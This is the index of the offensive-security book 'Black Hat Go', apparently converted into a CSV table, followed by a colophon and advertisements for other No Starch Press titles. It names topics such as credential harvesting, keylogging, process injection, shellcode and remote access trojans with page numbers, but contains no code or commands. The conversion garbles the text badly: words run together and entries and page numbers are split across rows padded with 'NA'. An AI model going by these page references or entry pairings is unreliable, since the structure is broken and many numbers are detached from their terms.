",",NA,NA
154,NA,NA
–,NA,NA
158,NA,NA
"documentmetadata,",NA,NA
69 ,NA,NA
"DocumentObjectModel(DOM),",NA,NA
74 ,NA,NA
"domainfronting,",NA,NA
98 ,NA,NA
"DOSHeader,",NA,NA
281 ,DWORD,NA
",",NA,NA
271,NA,NA
E,NA,NA
"echoservers,",NA,NA
32,NA,NA
",",NA,NA
35,NA,NA
–,NA,NA
37 ,NA,NA
"Empire,",NA,NA
121 ,Encode(),NA
"method,",NA,NA
65,encodeDecode(),NA
"function,",NA,NA
308,encoding,NA
"package,",NA,NA
197,NA,NA
"encodingprocess,",NA,NA
308 ,NA,NA
"encryption,",NA,NA
234,NA,NA
",",NA,NA
242,NA,NA
–,NA,NA
252 ,NA,NA
"endiannessfunction,",NA,NA
299 ,NA,NA
"errorhandling,",NA,NA
17,NA,NA
–,NA,NA
18 ,NA,NA
"errormessages,",NA,NA
51 ,NA,NA
"ExclusiveOR(XOR),",NA,NA
307,NA,NA
–,NA,NA
312 ,NA,NA
"ExecutableandLinkableFormat(ELF),",NA,NA
203 ,NA,NA
"exploitation,",NA,NA
196,NA,NA
–,NA,NA
212 ,NA,NA
"exportaddresstable(EAT),",NA,NA
279,NA,NA
F,NA,NA
"fieldtags,",NA,NA
19,NA,NA
–,NA,NA
20,NA,NA
",",NA,NA
139 ,NA,NA
"filesystems,",NA,NA
170,NA,NA
–,NA,NA
171 ,filetype,NA
"filter,",NA,NA
73,NA,NA
"filteredports,",NA,NA
22,NA,NA
"filteringsearchresults,",NA,NA
73,NA,NA
–,NA,NA
76 ,NA,NA
"firewalls,",NA,NA
22,NA,NA
–,NA,NA
23 ,fixed,NA
"fieldtag,",NA,NA
140,Flusher,NA
",",NA,NA
42,fmt,NA
"package,",NA,NA
25,NA,NA
"FOCA,",NA,NA
69 ,Foostruct,NA
",",NA,NA
19,for,NA
"loop,",NA,NA
15,NA,NA
formatting ,NA,NA
"data,",NA,NA
38,NA,NA
",",NA,NA
113,NA,NA
–,NA,NA
114 ,NA,NA
"sourcecode,",NA,NA
9 ,NA,NA
"Frida,",NA,NA
278 ,NA,NA
"fullyqualifieddomainname(FQDN),",NA,NA
104 ,NA,NA
"fuzzing,",NA,NA
188,NA,NA
–,NA,NA
196,NA,NA
G,NA,NA
"gapingsecurityholes,",NA,NA
41 ,Get(),NA
"function,",NA,NA
46,get(),NA
"HTTPfunction,",NA,NA
227,NA,NA
–,NA,NA
229,GetLoadLibAddress(),NA
"function,",NA,NA
275 ,GetProcessAddress(),NA
"Windowsfunction,",NA,NA
27,NA,NA
5,getRegex(),NA
"function,",NA,NA
163,GetSchema(),NA
"function,",NA,NA
163,NA,NA
",",NA,NA
165,NA,NA
"Gieben,Miek,",NA,NA
104 ,NA,NA
"GitHubAtom,",NA,NA
4,NA,NA
–,NA,NA
5 ,NA,NA
"GNUCompilerCollection(GCC),",NA,NA
290,NA,NA
"command,",NA,NA
6,NA,NA
–,NA,NA
7 ,NA,NA
"GoDNSpackage,",NA,NA
104 ,godoc,NA
"command,",NA,NA
8 ,gofmt,NA
"command,",NA,NA
9 ,goget,NA
"command,",NA,NA
8,NA,NA
–,NA,NA
9 ,NA,NA
"GoPlaygroundexecutionenvironment,",NA,NA
10 ,gorun,NA
"command,",NA,NA
6 ,NA,NA
GoSyntax ,NA,NA
"complexdatatypes,",NA,NA
10,NA,NA
–,NA,NA
11 ,NA,NA
"concurrency,",NA,NA
16,NA,NA
–,NA,NA
17 ,NA,NA
"controlstructures,",NA,NA
14,NA,NA
–,NA,NA
16 ,NA,NA
"datatypes,",NA,NA
10,NA,NA
–,NA,NA
11 ,NA,NA
"interfacetypes,",NA,NA
13 ,NA,NA
"maps,",NA,NA
11 ,NA,NA
"patterns,",NA,NA
12,NA,NA
–,NA,NA
14 ,NA,NA
"pointers,",NA,NA
12 ,NA,NA
"primitivedatatypes,",NA,NA
10,NA,NA
–,NA,NA
11 ,NA,NA
"slices,",NA,NA
11 ,NA,NA
"structtypes,",NA,NA
12,NA,NA
–,NA,NA
13 ,govet,NA
"command,",NA,NA
9 ,GOARCH,NA
"constraint,",NA,NA
7,NA,NA
–,NA,NA
8 ,NA,NA
"GoLand,",NA,NA
5,NA,NA
–,NA,NA
6 ,golint,NA
"command,",NA,NA
9 ,GOOS,NA
"constraint,",NA,NA
7,NA,NA
–,NA,NA
8 ,gopacket,NA
"package,",NA,NA
174 ,gopacket/pcap,NA
"subpackage,",NA,NA
174,NA,NA
–,NA,NA
175 ,GOPATH,NA
"environmentvariable,",NA,NA
2,NA,NA
–,NA,NA
3,NA,NA
"package,",NA,NA
69,gorilla/mux,NA
"package,",NA,NA
82,NA,NA
–,NA,NA
83,NA,NA
",",NA,NA
84,NA,NA
",",NA,NA
101,gorilla/websocket,NA
"package,",NA,NA
96,GOROOT,NA
"environmentvariable,",NA,NA
2,NA,NA
–,NA,NA
3,NA,NA
"goroutines,",NA,NA
16,NA,NA
–,NA,NA
17,NA,NA
",",NA,NA
26,NA,NA
–,NA,NA
32 ,NA,NA
"gRPCframework,",NA,NA
316,NA,NA
–,NA,NA
319 ,gss,NA
"package,",NA,NA
138,NA,NA
H,HandleFunc(),NA
"method,",NA,NA
82,handler(),NA
"function,",NA,NA
75,NA,NA
–,NA,NA
76,NA,NA
"handles,",NA,NA
271,NA,NA
.,NA,NA
Seealso,NA,NA
tokens ,NA,NA
"handshakeprocess,",NA,NA
22,NA,NA
–,NA,NA
23 ,NA,NA
"hash-basedauthentication,",NA,NA
147,NA,NA
–,NA,NA
150 ,NA,NA
"hashing,",NA,NA
234,NA,NA
–,NA,NA
239 ,Head(),NA
"function,",NA,NA
46,head(),NA
"HTTPfunction,",NA,NA
226,NA,NA
–,NA,NA
227,hex,NA
"transform,",NA,NA
214,NA,NA
hexadecimal,NA,NA
198,NA,NA
",",NA,NA
281,NA,NA
",",NA,NA
297 ,NA,NA
"HMAC(Keyed-HashMessageAuthenticationCode)standard, ",NA,NA
240,NA,NA
–,NA,NA
241 ,NA,NA
"Holt,Matt,",NA,NA
127 ,NA,NA
"hostsearch,",NA,NA
55,NA,NA
–,NA,NA
57 ,NA,NA
HTTPclients ,NA,NA
"overview,",NA,NA
46,NA,NA
–,NA,NA
51 ,NA,NA
"Bingscraping,",NA,NA
68,NA,NA
–,NA,NA
76 ,NA,NA
"Metasploitinteraction,",NA,NA
59,NA,NA
–,NA,NA
68,NA,NA
"Shodaninteraction,",NA,NA
51,NA,NA
–,NA,NA
59 ,NA,NA
HTTPservers ,NA,NA
"overview,",NA,NA
78,NA,NA
–,NA,NA
90 ,NA,NA
"credential-harvestingattacks,",NA,NA
90,NA,NA
–,NA,NA
93 ,NA,NA
"multiplexing,",NA,NA
98,NA,NA
–,NA,NA
10,NA,NA
2 ,NA,NA
"WebSocketAPI(WebSockets),",NA,NA
93,NA,NA
–,NA,NA
98 ,http.HandleFunc(),NA
",",NA,NA
78,NA,NA
–,NA,NA
79,NA,NA
I,if,NA
"statements,",NA,NA
18,NA,NA
"implantcode,",NA,NA
323,NA,NA
–,NA,NA
325,NA,NA
",",NA,NA
327,NA,NA
–,NA,NA
329 ,NA,NA
"importaddresstable(IAT),",NA,NA
279 ,NA,NA
"indexingmetadata,",NA,NA
68,NA,NA
–,NA,NA
76 ,NA,NA
"infiniteloops,",NA,NA
37 ,init(),NA
"function,",NA,NA
101,NA,NA
"input/output(I/O)tasks,",NA,NA
32,NA,NA
–,NA,NA
35 ,instreamset,NA
"filter,",NA,NA
73,NA,NA
"integrateddevelopmentenvironments(IDEs),",NA,NA
3,NA,NA
–,NA,NA
6 ,interface{},NA
"type,",NA,NA
97,NA,NA
"interfacetypes,",NA,NA
13 ,io,NA
"package,",NA,NA
32,NA,NA
",",NA,NA
197,io.Pipe(),NA
"function,",NA,NA
43,io.ReadCloser,NA
",",NA,NA
49,io.Reader,NA
",",NA,NA
32,NA,NA
–,NA,NA
35,NA,NA
",",NA,NA
46,ioutil.ReadAll(),NA
"function,",NA,NA
49,io.Writer,NA
",",NA,NA
32,NA,NA
–,NA,NA
35,NA,NA
J,NA,NA
"Java,",NA,NA
118,NA,NA
–,NA,NA
120 ,NA,NA
"JavaScript,",NA,NA
94,NA,NA
–,NA,NA
95 ,NA,NA
"JBoss,",NA,NA
198 ,NA,NA
"JetBrainsGoLand,",NA,NA
5,NA,NA
–,NA,NA
6 ,jQuery,NA
"package,",NA,NA
69,NA,NA
"JSBin,",NA,NA
94 ,NA,NA
"JSON,",NA,NA
19,NA,NA
",",NA,NA
50,NA,NA
",",NA,NA
54,NA,NA
",",NA,NA
139,NA,NA
",",NA,NA
159,NA,NA
K,NA,NA
"Kerberos,",NA,NA
133 ,NA,NA
"Kernel32.dll,",NA,NA
275 ,NA,NA
"Keyed-HashMessageAuthenticationCode(HMAC)standard, ",NA,NA
240,NA,NA
–,NA,NA
241 ,NA,NA
"keylogging,",NA,NA
93,NA,NA
–,NA,NA
98 ,NA,NA
"Kozierok,CharlesM.,",NA,NA
22,NA,NA
L,NA,NA
"labenvironments,",NA,NA
118,NA,NA
–,NA,NA
121 ,len,NA
"fieldtag,",NA,NA
140,NA,NA
"libraries,",NA,NA
2 ,NA,NA
"lightweightthreads,",NA,NA
16,NA,NA
–,NA,NA
17 ,loadLibraryA(),NA
"function,",NA,NA
275,Login(),NA
"method,",NA,NA
66,Logout(),NA
"method,",NA,NA
66,NA,NA
",",NA,NA
68,NA,NA
"loops,",NA,NA
15,NA,NA
",",NA,NA
37 ,NA,NA
"Luaplug-ins,",NA,NA
225,NA,NA
–,NA,NA
232,NA,NA
"Luhnchecks,",NA,NA
253,NA,NA
–,NA,NA
254,NA,NA
M,madvise(),NA
"function,",NA,NA
205,NA,NA
"magicbytes,",NA,NA
296 ,main(),NA
"function,",NA,NA
17,NA,NA
"mainpackage,",NA,NA
6 ,make(),NA
"function,",NA,NA
11,NA,NA
"MandatoryIntegrityControl,",NA,NA
271 ,NA,NA
"mappingdata,",NA,NA
71,NA,NA
–,NA,NA
73,NA,NA
",",NA,NA
125 ,NA,NA
"maps,",NA,NA
11 ,Marshal(),NA
"method,",NA,NA
19,marshalData(),NA
"method,",NA,NA
305,NA,NA
"marshalinginterfaces,",NA,NA
135 ,NA,NA
"MD5hashes,",NA,NA
236,NA,NA
–,NA,NA
237 ,NA,NA
"memory,",NA,NA
273,NA,NA
–,NA,NA
274 ,NA,NA
"messageauthentication,",NA,NA
239,NA,NA
–,NA,NA
241,NA,NA
.,NA,NA
Seealso,NA,NA
authentication ,NA,NA
"messageauthenticationcodes(MACs),",NA,NA
234 ,NA,NA
"MessagePack,",NA,NA
60 ,NA,NA
"metadata,",NA,NA
69,NA,NA
",",NA,NA
138,NA,NA
–,NA,NA
139 ,NA,NA
"MetasploitFramework,",NA,NA
59,NA,NA
–,NA,NA
68,NA,NA
",",NA,NA
213 ,NA,NA
"Meterpreter,",NA,NA
61,NA,NA
",",NA,NA
98,NA,NA
–,NA,NA
10,NA,NA
2 ,NA,NA
"MicrosoftAPIdocumentation,",NA,NA
263,NA,NA
–,NA,NA
265 ,NA,NA
"MicrosoftSQL(MSSQL)Serverdatabases,",NA,NA
157,NA,NA
–,NA,NA
158,NA,NA
", ",NA,NA
160,NA,NA
–,NA,NA
161 ,NA,NA
"MicrosoftVisualStudioCode,",NA,NA
5 ,NA,NA
"middleware,",NA,NA
80,NA,NA
–,NA,NA
81,NA,NA
",",NA,NA
83,NA,NA
–,NA,NA
88,NA,NA
"MinGW-w64,",NA,NA
290 ,mod,NA
"tool,",NA,NA
9,NA,NA
"MongoDBdatabases,",NA,NA
154,NA,NA
–,NA,NA
156,NA,NA
",",NA,NA
158,NA,NA
–,NA,NA
160 ,NA,NA
"MsfVenom,",NA,NA
213,NA,NA
",",NA,NA
278 ,Msgstruct,NA
",",NA,NA
106,NA,NA
–,NA,NA
107,NA,NA
"MSYS2,",NA,NA
290 ,NA,NA
"multichannelcommunication,",NA,NA
30,NA,NA
–,NA,NA
32 ,NA,NA
"multiplexing,",NA,NA
98,NA,NA
–,NA,NA
10,NA,NA
2 ,NA,NA
"mutex,",NA,NA
129 ,NA,NA
"mutualauthentication,",NA,NA
248,NA,NA
–,NA,NA
252 ,NA,NA
"MySQLdatabases,",NA,NA
156,NA,NA
–,NA,NA
157,NA,NA
",",NA,NA
160,NA,NA
–,NA,NA
161,NA,NA
N,NA,NA
"namedfunctions,",NA,NA
126 ,NA,NA
"nativeplug-ins,",NA,NA
218,NA,NA
–,NA,NA
224 ,negroni,NA
"package,",NA,NA
83,NA,NA
–,NA,NA
88,NA,NA
"Nessusvulnerabilityscanner,",NA,NA
21,NA,NA
7 ,net,NA
"package,",NA,NA
24,NA,NA
–,NA,NA
25,NA,NA
",",NA,NA
197,NA,NA
"Netcat,",NA,NA
40,NA,NA
–,NA,NA
44 ,net.Conn,NA
",",NA,NA
35 ,net/http,NA
"standardpackage,",NA,NA
46,NA,NA
",",NA,NA
48,New(),NA
"helperfunction,",NA,NA
53,NA,NA
–,NA,NA
54,NewProperties(),NA
"function,",NA,NA
72,NA,NA
–,NA,NA
73,NewRequest(),NA
"function,",NA,NA
48,NA,NA
"Nmap,",NA,NA
225 ,NA,NA
"nonconcurrentscanning,",NA,NA
25,NA,NA
–,NA,NA
26,NA,NA
"NoSQLdatabases,",NA,NA
154,NA,NA
",",NA,NA
158 ,NA,NA
"NTLANManager(NTLM)authentication,",NA,NA
150,NA,NA
–,NA,NA
151 ,NA,NA
"NTLMSecuritySupportProvider(NTLMSSP),",NA,NA
133,NA,NA
–,NA,NA
135 ,NA,NA
"NTOWFv2,",NA,NA
148 ,num,NA
"transform,",NA,NA
214,NA,NA
O,NA,NA
"obfuscation,",NA,NA
307 ,NA,NA
"OfficeOpenXMLdocuments,",NA,NA
69 ,offset,NA
"fieldtag,",NA,NA
140,NA,NA
"offsetvalues,",NA,NA
300 ,omitempty,NA
",",NA,NA
62,NA,NA
"openports,",NA,NA
22 ,NA,NA
"OPSEC,",NA,NA
329 ,NA,NA
"OptionalHeader,",NA,NA
284,NA,NA
–,NA,NA
285 ,NA,NA
"Oracle,",NA,NA
154 ,os,NA
"package,",NA,NA
197,os/exec,NA
"package,",NA,NA
41,NA,NA
P,NA,NA
"packages,",NA,NA
2,NA,NA
",",NA,NA
8,NA,NA
–,NA,NA
9 ,NA,NA
"packetcapturingandfiltering,",NA,NA
175,NA,NA
–,NA,NA
180 ,panic(),NA
"function,",NA,NA
107,NA,NA
",",NA,NA
112,parseTags(),NA
"function,",NA,NA
140,NA,NA
–,NA,NA
142,NA,NA
"passivereconnaissance,",NA,NA
51,NA,NA
",",NA,NA
59 ,NA,NA
"pass-the-hashauthentication,",NA,NA
147,NA,NA
–,NA,NA
150,NA,NA
"passwords,",NA,NA
146,NA,NA
–,NA,NA
151,NA,NA
",",NA,NA
222,NA,NA
–,NA,NA
224 ,NA,NA
"PATCHrequests,",NA,NA
47 ,NA,NA
"payloads,",NA,NA
101,NA,NA
",",NA,NA
302,NA,NA
–,NA,NA
307 ,pcap,NA
",",NA,NA
175,NA,NA
"PDFfiles,",NA,NA
69 ,NA,NA
"PE(PortableExecutable)format,",NA,NA
279,NA,NA
–,NA,NA
289 ,PipeReader,NA
",",NA,NA
43,PipeWriter,NA
",",NA,NA
43,NA,NA
"PKCS(PublicKeyCryptographyStandards),",NA,NA
242,NA,NA
.,NA,NA
Seealso ,NA,NA
public-keycryptography ,NA,NA
"pkgdirectory,",NA,NA
2,NA,NA
–,NA,NA
3 ,NA,NA
"placeholders,",NA,NA
83,NA,NA
",",NA,NA
89 ,NA,NA
"Plan9operatingsystem,",NA,NA
216 ,NA,NA
plug-ins ,NA,NA
"Lua,",NA,NA
225,NA,NA
–,NA,NA
232 ,NA,NA
"native,",NA,NA
218,NA,NA
–,NA,NA
224 ,plugin,NA
"package,",NA,NA
219,NA,NA
"PNGformat,",NA,NA
296,NA,NA
–,NA,NA
307 ,NA,NA
"pointers,",NA,NA
12 ,NA,NA
"PortableExecutable(PE)format,",NA,NA
279,NA,NA
–,NA,NA
289 ,NA,NA
"PortableNetworkGraphics(PNG)images,",NA,NA
296,NA,NA
–,NA,NA
307 ,NA,NA
ports ,NA,NA
"availability,",NA,NA
24,NA,NA
–,NA,NA
25 ,NA,NA
"handshakeprocess,",NA,NA
22 ,NA,NA
"portforwarding,",NA,NA
23,NA,NA
",",NA,NA
39,NA,NA
–,NA,NA
40 ,NA,NA
"portscanners,",NA,NA
180,NA,NA
–,NA,NA
185,NA,NA
",",NA,NA
222,NA,NA
–,NA,NA
224 ,NA,NA
"scanning,",NA,NA
23,NA,NA
–,NA,NA
32,NA,NA
.,NA,NA
Seealso,NA,NA
scanners,NA,NA
"function,",NA,NA
46,NA,NA
–,NA,NA
47,PostForm(),NA
"function,",NA,NA
47,NA,NA
"Postgresdatabases,",NA,NA
156,NA,NA
–,NA,NA
157,NA,NA
",",NA,NA
160,NA,NA
–,NA,NA
161 ,NA,NA
"PostgreSQLdatabases,",NA,NA
156,NA,NA
–,NA,NA
157,NA,NA
",",NA,NA
160,NA,NA
–,NA,NA
161 ,PreProcessImage(),NA
"function,",NA,NA
298,NA,NA
"primitivedatatypes,",NA,NA
10,NA,NA
–,NA,NA
11 ,process(),NA
"function,",NA,NA
72,NA,NA
–,NA,NA
73,NA,NA
"ProcessHacker,",NA,NA
278 ,NA,NA
"processinjection,",NA,NA
268,NA,NA
–,NA,NA
269 ,NA,NA
"ProcessMonitor,",NA,NA
278 ,ProcessImage(),NA
"method,",NA,NA
302,NA,NA
–,NA,NA
303,procselfmem(),NA
"function,",NA,NA
205,NA,NA
"projectstructure,",NA,NA
52,NA,NA
–,NA,NA
53,NA,NA
",",NA,NA
60 ,promisc,NA
"variable,",NA,NA
177,NA,NA
"ProtocolBuffers(Protobuf),",NA,NA
316 ,NA,NA
"PsExec,",NA,NA
131 ,NA,NA
"public-keycryptography,",NA,NA
242,NA,NA
",",NA,NA
245,NA,NA
.,NA,NA
Seealso,NA,NA
encryption ,NA,NA
"PUTrequests,",NA,NA
47,NA,NA
–,NA,NA
48 ,NA,NA
"Python,",NA,NA
197,NA,NA
–,NA,NA
201,NA,NA
Q,NA,NA
"queryparameters,",NA,NA
73,NA,NA
–,NA,NA
76,NA,NA
R,NA,NA
"raceconditionfunctions,",NA,NA
20,NA,NA
6 ,NA,NA
"Rapid7,",NA,NA
60,NA,NA
"RATs(remoteaccessTrojans),",NA,NA
315,NA,NA
–,NA,NA
329 ,raw,NA
"transform,",NA,NA
215,NA,NA
"RC2,",NA,NA
252,NA,NA
–,NA,NA
261 ,ReadString(),NA
"function,",NA,NA
38,NA,NA
"reconnaissance,",NA,NA
51,NA,NA
",",NA,NA
59 ,NA,NA
"redirectors,",NA,NA
98 ,NA,NA
"referentialfields,",NA,NA
138,NA,NA
–,NA,NA
139 ,reflect,NA
"package,",NA,NA
139,NA,NA
"reflection,",NA,NA
132,NA,NA
",",NA,NA
139 ,NA,NA
"regularexpression(regex)values,",NA,NA
163 ,NA,NA
"remoteaccessTrojans(RATs),",NA,NA
315,NA,NA
–,NA,NA
329 ,NA,NA
"remoteprocedurecalls(RPCs),",NA,NA
59,NA,NA
",",NA,NA
64,NA,NA
–,NA,NA
67,NA,NA
",",NA,NA
316 ,NA,NA
"request/responsecycles,",NA,NA
46,NA,NA
",",NA,NA
62,NA,NA
–,NA,NA
64 ,NA,NA
"responsehandling,",NA,NA
48,NA,NA
–,NA,NA
51 ,NA,NA
"Rivest,Ron,",NA,NA
252 ,RLock,NA
",",NA,NA
129,NA,NA
"Roundcube,",NA,NA
90 ,NA,NA
"routers,",NA,NA
79,NA,NA
–,NA,NA
80,NA,NA
",",NA,NA
84,NA,NA
–,NA,NA
85 ,NA,NA
"rstpackets,",NA,NA
22,NA,NA
S,NA,NA
"salts,",NA,NA
234 ,scanner,NA
"package,",NA,NA
220,NA,NA
",",NA,NA
223,NA,NA
"scanners,",NA,NA
23,NA,NA
–,NA,NA
32,NA,NA
",",NA,NA
180,NA,NA
–,NA,NA
185,NA,NA
",",NA,NA
217,NA,NA
",",NA,NA
222,NA,NA
–,NA,NA
224,NA,NA
.,NA,NA
Seealso,NA,NA
ports ,NA,NA
"schema-lessdatabases,",NA,NA
154 ,NA,NA
"scrapingmetadata,",NA,NA
68,NA,NA
–,NA,NA
76 ,Search(),NA
"function,",NA,NA
163,NA,NA
"searchquerytemplates,",NA,NA
73,NA,NA
–,NA,NA
76 ,NA,NA
"SectionTable,",NA,NA
287,NA,NA
–,NA,NA
289 ,NA,NA
"securitytokens,",NA,NA
133,NA,NA
–,NA,NA
134 ,send(),NA
"method,",NA,NA
65,serveFile(),NA
"function,",NA,NA
97,NA,NA
"ServerMessageBlock(SMB),",NA,NA
132,NA,NA
–,NA,NA
147 ,NA,NA
"servermultiplexers,",NA,NA
78,NA,NA
–,NA,NA
79 ,ServerMux,NA
",",NA,NA
78,NA,NA
–,NA,NA
79,SessionList(),NA
"method,",NA,NA
66,NA,NA
",",NA,NA
68,set,NA
"command,",NA,NA
3,NA,NA
"SHA-256hashes,",NA,NA
236,NA,NA
–,NA,NA
237 ,NA,NA
"shellcode,",NA,NA
203,NA,NA
–,NA,NA
204,NA,NA
",",NA,NA
213,NA,NA
–,NA,NA
216 ,NA,NA
"Shodan,",NA,NA
51,NA,NA
–,NA,NA
59 ,NA,NA
"signaturevalidation,",NA,NA
245,NA,NA
–,NA,NA
248 ,site,NA
"filter,",NA,NA
73,NA,NA
"slices,",NA,NA
11,NA,NA
",",NA,NA
106,NA,NA
",",NA,NA
126,NA,NA
",",NA,NA
144,NA,NA
–,NA,NA
145 ,NA,NA
"SQLinjectionfuzzing,",NA,NA
192,NA,NA
–,NA,NA
196 ,NA,NA
"SQLitedatabases,",NA,NA
328 ,NA,NA
"srcdirectory,",NA,NA
3 ,NA,NA
"statelessprotocols,",NA,NA
46 ,NA,NA
"staticfiles,",NA,NA
93 ,Status,NA
"struct,",NA,NA
50,NA,NA
–,NA,NA
51,NA,NA
steganography ,NA,NA
"overview,",NA,NA
295 ,NA,NA
"PNGformat,",NA,NA
296,NA,NA
–,NA,NA
307 ,NA,NA
"XOR,",NA,NA
307,NA,NA
–,NA,NA
312 ,strconv,NA
"package,",NA,NA
25,NA,NA
"function,",NA,NA
17,strToInt(),NA
"method,",NA,NA
304,NA,NA
structs ,APIInfo,NA
"struct,",NA,NA
55 ,Client,NA
"struct,",NA,NA
53,NA,NA
–,NA,NA
54 ,NA,NA
"encoding,",NA,NA
135 ,Foostruct,NA
",",NA,NA
19 ,NA,NA
"handling,",NA,NA
142,NA,NA
–,NA,NA
143 ,Msgstruct,NA
",",NA,NA
106,NA,NA
–,NA,NA
107 ,Status,NA
"struct,",NA,NA
50,NA,NA
–,NA,NA
51 ,NA,NA
"typesof,",NA,NA
12,NA,NA
–,NA,NA
13,NA,NA
",",NA,NA
19,NA,NA
",",NA,NA
133,NA,NA
–,NA,NA
135 ,NA,NA
"structureddata,",NA,NA
18,NA,NA
–,NA,NA
19,NA,NA
",",NA,NA
50,NA,NA
–,NA,NA
51 ,NA,NA
"Stub,",NA,NA
281 ,NA,NA
"subdirectories,",NA,NA
2,NA,NA
–,NA,NA
3 ,NA,NA
"subdomains,",NA,NA
107,NA,NA
–,NA,NA
117 ,switch,NA
"statements,",NA,NA
14,NA,NA
",",NA,NA
129,NA,NA
",",NA,NA
143,NA,NA
"switchednetworks,",NA,NA
178 ,NA,NA
"symmetricalgorithms,",NA,NA
234 ,NA,NA
"symmetric-keyencryption,",NA,NA
242,NA,NA
–,NA,NA
245,NA,NA
.,NA,NA
Seealso,NA,NA
encryption ,NA,NA
"SYNcookies,",NA,NA
180,NA,NA
–,NA,NA
185 ,NA,NA
"synpackets,",NA,NA
22 ,NA,NA
"syn-acks,",NA,NA
22 ,NA,NA
"SYN-floodprotections,",NA,NA
180,NA,NA
–,NA,NA
185 ,syscall,NA
"package,",NA,NA
197,NA,NA
",",NA,NA
266,NA,NA
–,NA,NA
269,Syscall6(),NA
"function,",NA,NA
210,NA,NA
T,NA,NA
"package,",NA,NA
113,NA,NA
–,NA,NA
114,NA,NA
"Targetbreach,",NA,NA
154 ,NA,NA
"TCPflags,",NA,NA
180,NA,NA
–,NA,NA
181 ,NA,NA
"tcpdump,",NA,NA
102,NA,NA
",",NA,NA
105,NA,NA
",",NA,NA
175,NA,NA
–,NA,NA
178 ,NA,NA
TCP/IPGuide,NA,NA
"(Kozierok),",NA,NA
22 ,NA,NA
"teamservers,",NA,NA
121 ,NA,NA
"Telegram,",NA,NA
280 ,NA,NA
"Telnet,",NA,NA
41 ,NA,NA
"templates,",NA,NA
88,NA,NA
–,NA,NA
90 ,NA,NA
"Tenable,",NA,NA
217 ,NA,NA
"third-partypackages,",NA,NA
8,NA,NA
–,NA,NA
9 ,NA,NA
"tokens,",NA,NA
61,NA,NA
–,NA,NA
63,NA,NA
",",NA,NA
271,NA,NA
"“toofast”scanner,",NA,NA
26,NA,NA
–,NA,NA
27 ,NA,NA
TourofGo,NA,NA
"tutorial,",NA,NA
10 ,NA,NA
TransmissionControlProtocol(TCP) ,NA,NA
"handshakeprocess,",NA,NA
22,NA,NA
–,NA,NA
23 ,NA,NA
"portscanners,",NA,NA
23,NA,NA
–,NA,NA
32 ,NA,NA
"proxies,",NA,NA
32,NA,NA
–,NA,NA
44,NA,NA
U,NA,NA
"UbuntuVM,",NA,NA
118,NA,NA
–,NA,NA
120 ,uint16,NA
"datatypes,",NA,NA
143,NA,NA
–,NA,NA
144,uintptr,NA
"type,",NA,NA
266,unicode,NA
"package,",NA,NA
197,unmarshal(),NA
"function,",NA,NA
141,NA,NA
–,NA,NA
142,Unmarshal(),NA
"method,",NA,NA
19,NA,NA
"unmarshalinginterfaces,",NA,NA
136,NA,NA
"package,",NA,NA
197,unsafe.Pointer,NA
"type,",NA,NA
266,NA,NA
–,NA,NA
267,NA,NA
"USERproperty,",NA,NA
190 ,NA,NA
"utilityprograms,",NA,NA
67,NA,NA
–,NA,NA
68,NA,NA
V,"{{
 variable-name
 }}",NA
"convention,",NA,NA
89,NA,NA
"verbs,",NA,NA
47 ,NA,NA
"Vimtexteditor,",NA,NA
3,NA,NA
–,NA,NA
4 ,vim-go,NA
"plug-in,",NA,NA
3,NA,NA
"virtualmachines(VMs),",NA,NA
118,NA,NA
–,NA,NA
120 ,NA,NA
"virtualmemory,",NA,NA
273,NA,NA
–,NA,NA
274 ,VirtualAllocEx,NA
",",NA,NA
273,NA,NA
–,NA,NA
274,VirtualFreeEx(),NA
"Windowsfunction,",NA,NA
277,NA,NA
–,NA,NA
278,NA,NA
"VMWareWorkstation,",NA,NA
118,NA,NA
–,NA,NA
120 ,NA,NA
"VSCode,",NA,NA
5 ,NA,NA
"vulnerabilityfuzzers,",NA,NA
188,NA,NA
–,NA,NA
196,NA,NA
W,WaitforSingleObject(),NA
"Windowsfunction,",NA,NA
276,NA,NA
–,NA,NA
277,waitForWrite(),NA
"function,",NA,NA
206,WaitGroup,NA
",",NA,NA
27,NA,NA
–,NA,NA
28,walkFn(),NA
"function,",NA,NA
171,NA,NA
"WebSocketAPI(WebSockets),",NA,NA
93,NA,NA
–,NA,NA
98 ,while,NA
"loops,",NA,NA
15,NA,NA
"WindowsAPIs,",NA,NA
263,NA,NA
–,NA,NA
265,HivaNetwork.Com,NA
"WindowsDLL,",NA,NA
218,NA,NA
–,NA,NA
219 ,NA,NA
"WindowsVM,",NA,NA
127 ,NA,NA
"winmodsfiles,",NA,NA
270 ,NA,NA
"WINNT.Hheader,",NA,NA
285,NA,NA
–,NA,NA
286 ,NA,NA
"Wireshark,",NA,NA
102,NA,NA
",",NA,NA
225 ,NA,NA
"workerfunctions,",NA,NA
28,NA,NA
–,NA,NA
30,NA,NA
",",NA,NA
111,NA,NA
–,NA,NA
112 ,NA,NA
"wrapperfunctions,",NA,NA
136,NA,NA
–,NA,NA
137 ,WriteData(),NA
"function,",NA,NA
305,NA,NA
–,NA,NA
307,NA,NA
",",NA,NA
311,WriteProcessMemory(),NA
"function,",NA,NA
274,NA,NA
–,NA,NA
275,writer.Flush(),NA
"function,",NA,NA
38,WriteString(),NA
"function,",NA,NA
38,NA,NA
X,NA,NA
"XML,",NA,NA
19,NA,NA
–,NA,NA
20,NA,NA
",",NA,NA
69 ,NA,NA
"XOR,",NA,NA
307,NA,NA
–,NA,NA
312,NA,NA
BlackHatGo,NA,NA
"issetinNewBaskerville,Futura,Dogma,and ",NA,NA
TheSansMonoCondensed.,NA,NA
UPDATES,NA,NA
Visit,NA,NA
https://nostarch.com/blackhatgo/,NA,NA
"forupdates,errata,",NA,NA
andotherinformation.,NA,NA
Moreno-nonsensebooksfrom,NA,NA
NOSTARCH,NA,NA
PRESS,NA,NA
REAL-WORLDBUGHUNTING ,NA,NA
AFieldGuidetoWebHacking ,NA,NA
by,"PETERYAWORSKI
  
 JULY",NA
"2019,264",PP,NA
".,$39.95",ISBN,NA
978-1-59327-861-8,NA,NA
MALWAREDATASCIENCE ,NA,NA
AttackDetectionandAttributio,NA,NA
n ,NA,NA
by,JOSHUASAXE,NA
with,"HILLARYSANDERS 
  
 SEPTEMBER",NA
"2018,272",PP,NA
".,$49.95 ",ISBN,NA
978-1-59327-859-5,NA,NA
LINUXBASICSFORHACKERS,NA,NA
"GettingStartedwithNetworking,Scripting,and ",NA,NA
SecurityinKali ,NA,NA
by,"OCCUPYTHEWEB 
  
 DECEMBER",NA
"2018,248",PP,NA
".,$34.95 ",ISBN,NA
978-1-59327-855-7,NA,NA
SERIOUSCRYPTOGRAPHY ,NA,NA
APracticalIntroductiontoModernEncryption ,NA,NA
by,"JEAN-PHILIPPEAUMASSON 
  
